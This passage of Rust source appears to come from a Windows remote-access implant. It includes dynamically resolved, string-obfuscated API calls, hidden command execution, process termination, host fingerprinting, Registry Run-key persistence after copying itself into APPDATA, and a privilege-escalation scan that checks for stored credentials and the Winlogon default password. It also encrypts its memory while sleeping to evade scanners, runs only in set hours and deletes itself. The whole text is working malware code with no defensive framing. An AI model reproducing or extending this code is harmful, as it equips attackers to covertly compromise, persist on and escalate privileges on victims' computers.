                out.push_str(&format!("{}\t{}\t{}\n", pe.th32ProcessID, pe.cntThreads, name));
                if p32n(snap, pe_ptr) == 0 { break; }
            }
        }
        windows_sys::Win32::Foundation::CloseHandle(snap as *mut std::ffi::c_void);
        return out;
    }
    #[cfg(not(target_os = "windows"))]
    "?".into()
}

fn builtin_kill(pid_str: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        if let Ok(pid) = pid_str.trim().parse::<u32>() {
            unsafe {
                type FnOP = unsafe extern "system" fn(u32, i32, u32) -> isize;
                type FnTP = unsafe extern "system" fn(isize, u32) -> i32;
                let (Some(a1), Some(a2)) = (
                    resolve_fn(&ENC_K32, &ENC_FN_OP),
                    resolve_fn(&ENC_K32, &ENC_FN_TP),
                ) else { return "err: resolve".into(); };
                let op: FnOP = std::mem::transmute(a1);
                let tp: FnTP = std::mem::transmute(a2);
                let h = op(0x0001, 0, pid); // PROCESS_TERMINATE
                if h == 0 { return "err: access denied".into(); }
                let r = tp(h, 1);
                windows_sys::Win32::Foundation::CloseHandle(h as *mut std::ffi::c_void);
                if r != 0 { return "ok".into(); }
                return "err: failed".into();
            }
        }
        return "err: invalid pid".into();
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = pid_str; "?".into() }
}

fn get_os_version() -> String {
    #[cfg(target_os = "windows")]
    {
        #[repr(C)]
        struct OsVerInfo { size: u32, major: u32, minor: u32, build: u32, platform: u32, csd: [u16; 128] }
        if let Some(addr) = resolve_fn(&ENC_NTDLL, &ENC_RTLGV) {
            type RtlGV = unsafe extern "system" fn(*mut OsVerInfo) -> i32;
            let rtl_gv: RtlGV = unsafe { std::mem::transmute(addr) };
            let mut info = OsVerInfo { size: std::mem::size_of::<OsVerInfo>() as u32,
                major: 0, minor: 0, build: 0, platform: 0, csd: [0; 128] };
            unsafe { rtl_gv(&mut info); }
            return format!("{}.{}.{}", info.major, info.minor, info.build);
        }
    }
    "?".into()
}

fn gather_system_info() -> String {
    let mut info = Vec::new();
    info.push(format!("user={}", builtin_whoami()));
    info.push(format!("host={}", builtin_hostname()));
    info.push(format!("os={}", env::var(xd(&ENC_ENV_OS)).unwrap_or_default()));
    info.push(format!("arch={}", env::var(xd(&ENC_ENV_ARCH)).unwrap_or_default()));
    info.push(format!("dir={}", env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_default()));
    info.push(format!("ver={}", get_os_version()));
    info.push(format!("admin={}", if is_admin() { "yes" } else { "no" }));
    info.join("|")
}

fn needs_shell(cmd: &str) -> bool {
    cmd.contains('|') || cmd.contains('>') || cmd.contains('<')
        || cmd.contains('&') || cmd.contains('^') || cmd.contains('%')
        || cmd.contains('"')
}

fn exec_command(cmd: &str) -> String {
    let mut c = if needs_shell(cmd) {
        let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
        c.args(&["/C", cmd]);
        c
    } else {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.is_empty() { return "?".into(); }
        let mut c = std::process::Command::new(parts[0]);
        if parts.len() > 1 { c.args(&parts[1..]); }
        c
    };
    #[cfg(target_os = "windows")]
    { use std::os::windows::process::CommandExt; c.creation_flags(0x08000000); }
    match c.output() {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            if !stderr.is_empty() { result.push_str(&stderr); }
            if result.is_empty() { result = format!("(exit {})", output.status.code().unwrap_or(-1)); }
            result
        }
        Err(e) => format!("err: {}", e),
    }
}

fn install_persistence() -> String {
    let exe = match env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return "err".into(),
    };

    let appdata = env::var(xd(&ENC_ENV_APPDATA)).unwrap_or_default();
    if appdata.is_empty() { return "err".into(); }

    let pn = xd(&ENC_PERSIST_NAME).trim().to_string();
    let dest = format!("{}\\{}.exe", appdata, pn);

    if let Err(e) = std::fs::copy(&exe, &dest) { return format!("err: {}", e); }

    #[cfg(target_os = "windows")]
    unsafe {
        type FnROKE = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
        type FnRSVE = unsafe extern "system" fn(isize, *const u16, u32, u32, *const u8, u32) -> i32;
        type FnRCK = unsafe extern "system" fn(isize) -> i32;
        let (Some(a1), Some(a2), Some(a3)) = (
            resolve_fn(&ENC_ADV32, &ENC_FN_ROKE),
            resolve_fn(&ENC_ADV32, &ENC_FN_RSVE),
            resolve_fn(&ENC_ADV32, &ENC_FN_RCK),
        ) else { return "err: resolve".into(); };
        let roke: FnROKE = std::mem::transmute(a1);
        let rsve: FnRSVE = std::mem::transmute(a2);
        let rck: FnRCK = std::mem::transmute(a3);
        let subkey = xd(&ENC_REG_RUN).trim().to_string();
        let wsubkey: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey: isize = 0;
        if roke(-2147483647i32 as isize, wsubkey.as_ptr(), 0, 0x0002, &mut hkey) != 0 {
            return "err: reg open".into();
        }
        let wname: Vec<u16> = pn.encode_utf16().chain(std::iter::once(0)).collect();
        let wval: Vec<u16> = dest.encode_utf16().chain(std::iter::once(0)).collect();
        let r = rsve(hkey, wname.as_ptr(), 0, 1, wval.as_ptr() as *const u8, (wval.len() * 2) as u32);
        rck(hkey);
        if r != 0 { return "err: reg set".into(); }
    }
    format!("+{}", dest)
}

fn privesc_scan() -> String {
    let mut r = String::with_capacity(4096);

    r.push_str("[1]\n");
    if let Ok(out) = rcmd(&xd(&ENC_WHOAMI_PRIV)) {
        let privs: &[&[u8]] = &[&ENC_SE_IMP, &ENC_SE_DBG, &ENC_SE_BAK, &ENC_SE_RST,
                                  &ENC_SE_TOW, &ENC_SE_LDR, &ENC_SE_TCB, &ENC_SE_ASN];
        let en = xd(&ENC_ENABLED);
        for line in out.lines() {
            for p in privs {
                let pn = xd(p);
                let pt = pn.trim();
                if line.contains(pt) && line.contains(&en) {
                    r.push_str(&format!(" +{}\n", pt));
                }
            }
        }
    }

    r.push_str("\n[2]\n");
    if let Ok(out) = rcmd(&xd(&ENC_WMIC_SVC).trim()) {
        let pf = xd(&ENC_PROG_FILES);
        for line in out.lines() {
            if line.contains(&pf) && !line.contains("\"") {
                r.push_str(&format!(" +{}\n", line.trim()));
            }
        }
    }

    r.push_str("\n[3]\n");
    let lm = rcmd(&xd(&ENC_REG_AIE_LM));
    let cu = rcmd(&xd(&ENC_REG_AIE_CU));
    let v1 = xd(&ENC_0X1);
    if let (Ok(l), Ok(c)) = (&lm, &cu) {
        if l.contains(&v1) && c.contains(&v1) { r.push_str(" +\n"); } else { r.push_str(" -\n"); }
    }

    r.push_str("\n[4]\n");
    if let Ok(out) = rcmd(&xd(&ENC_CMDKEY)) {
        let tgt = xd(&ENC_TARGET);
        if out.contains(&tgt) { r.push_str(" +\n"); }
    }

    r.push_str("\n[5]\n");
    unsafe {
        type FnROKE = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
        type FnRQVE = unsafe extern "system" fn(isize, *const u16, *const u16, *mut u32, *mut u8, *mut u32) -> i32;
        type FnRCK = unsafe extern "system" fn(isize) -> i32;
        if let (Some(a1), Some(a2), Some(a3)) = (
            resolve_fn(&ENC_ADV32, &ENC_FN_ROKE),
            resolve_fn(&ENC_ADV32, &ENC_FN_RQVE),
            resolve_fn(&ENC_ADV32, &ENC_FN_RCK),
        ) {
            let roke: FnROKE = std::mem::transmute(a1);
            let rqve: FnRQVE = std::mem::transmute(a2);
            let rck: FnRCK = std::mem::transmute(a3);
            let subkey = xd(&ENC_WINLOGON_KEY).trim().to_string();
            let ws: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();
            let mut hkey: isize = 0;
            // HKEY_LOCAL_MACHINE = 0x80000002u32 as i32 as isize
            if roke(-2147483646i32 as isize, ws.as_ptr(), 0, 0x0001, &mut hkey) == 0 {
                let vn = xd(&ENC_DEFPW_VAL);
                let wv: Vec<u16> = vn.encode_utf16().chain(std::iter::once(0)).collect();
                let mut dtype: u32 = 0;
                let mut size: u32 = 0;
                let qr = rqve(hkey, wv.as_ptr(), std::ptr::null(), &mut dtype, std::ptr::null_mut(), &mut size);
                if qr == 0 && size > 2 { r.push_str(" +\n"); } else { r.push_str(" -\n"); }
                rck(hkey);
            } else {
                r.push_str(" -\n");
            }
        }
    }

    r
}

fn sleep_encrypted(ms: u64) {
    let key: [u8; 32] = rand::random();

    #[cfg(target_os = "windows")]
    let regions = get_writable_regions();

    #[cfg(target_os = "windows")]
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }

    std::thread::sleep(Duration::from_millis(ms));

    #[cfg(target_os = "windows")]
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }
}

fn xor_region(data: &mut [u8], key: &[u8; 32]) {
    for (i, b) in data.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
}

#[cfg(target_os = "windows")]
fn get_writable_regions() -> Vec<(usize, usize)> {
    let mut regions = Vec::new();
    let mut addr: usize = 0x10000;
    let max_addr: usize = 0x7FFFFFFEFFFF;

    unsafe {
        type FnVQ = unsafe extern "system" fn(*const std::ffi::c_void, *mut u8, usize) -> usize;
        let Some(a) = resolve_fn(&ENC_K32, &ENC_FN_VQ) else { return regions; };
        let vq: FnVQ = std::mem::transmute(a);
        let current_module = windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(std::ptr::null());
        let module_base = current_module as usize;

        while addr < max_addr {
            let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
            let ret = vq(
                addr as *const _,
                &mut mbi as *mut _ as *mut u8,
                std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
            );
            if ret == 0 { break; }

            let region_start = mbi.BaseAddress as usize;
            let region_size = mbi.RegionSize;

            // MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04
            if mbi.State == 0x1000 && mbi.Protect == 0x04 {
                // Skip our own code section and stack guard pages
                if region_start != module_base && region_size > 4096 && region_size < 64 * 1024 * 1024 {
                    regions.push((region_start, region_size));
                }
            }

            addr = region_start + region_size;
            if addr <= region_start { break; }
        }
    }
    regions
}

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

fn is_work_hours() -> bool {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or(Duration::from_secs(0))
        .as_secs();
    let hour = ((secs % 86400) / 3600) as u32;
    hour >= WORK_HOUR_START && hour < WORK_HOUR_END
}

fn self_delete() {
    if let Ok(exe) = env::current_exe() {
        let tmp = env::temp_dir().join(format!("{:x}.tmp", rand::random::<u64>()));
        let _ = std::fs::rename(&exe, &tmp);
        let p = tmp.clone();
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_secs(3));
            let _ = std::fs::remove_file(&p);
        });
    }
}


fn rcmd(cmd: &str) -> Result<String, std::io::Error> {
    let mut c = if needs_shell(cmd) {
        let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
        c.args(&["/C", cmd]);
        c
    } else {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.is_empty() { return Ok(String::new()); }
        let mut c = std::process::Command::new(parts[0]);
        if parts.len() > 1 { c.args(&parts[1..]); }
        c
    };
    #[cfg(target_os = "windows")]
    { use std::os::windows::process::CommandExt; c.creation_flags(0x08000000); }
    let output = c.output()?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

fn is_admin() -> bool {
    #[cfg(target_os = "windows")]
    unsafe {
        type FnOPT = unsafe extern "system" fn(isize, u32, *mut isize) -> i32;
        type FnGTI = unsafe extern "system" fn(isize, u32, *mut u8, u32, *mut u32) -> i32;
        let (Some(a1), Some(a2)) = (
            resolve_fn(&ENC_ADV32, &ENC_FN_OPT),
            resolve_fn(&ENC_ADV32, &ENC_FN_GTI),
        ) else { return false; };
        let opt: FnOPT = std::mem::transmute(a1);
        let gti: FnGTI = std::mem::transmute(a2);
        let mut token: isize = 0;
        if opt(
            windows_sys::Win32::System::Threading::GetCurrentProcess() as isize,
            8, &mut token,
        ) == 0 { return false; }
        let mut elevation: u32 = 0;
        let mut ret_len: u32 = 0;
        let r = gti(token, 20, &mut elevation as *mut u32 as *mut u8, 4, &mut ret_len);
        windows_sys::Win32::Foundation::CloseHandle(token as *mut std::ffi::c_void);
        return r != 0 && elevation != 0;
    }
    #[cfg(not(target_os = "windows"))]
    false
}
